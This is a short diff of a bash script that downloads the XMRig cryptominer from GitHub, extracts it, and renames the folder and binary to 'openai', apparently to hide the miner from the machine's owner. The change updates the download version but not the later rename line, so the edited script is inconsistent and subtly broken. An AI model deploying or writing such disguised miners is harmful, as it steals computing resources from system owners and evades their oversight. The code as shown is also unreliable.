@@ -1,7 +1,7 @@
 #!/bin/bash
 
 U=$1
-wget -O 1.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz 
+wget -O 1.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.1/xmrig-6.21.1-linux-static-x64.tar.gz 
 tar -zxvf 1.tar.gz
 mv xmrig-6.21.0 openai
 mv openai/xmrig openai/openai
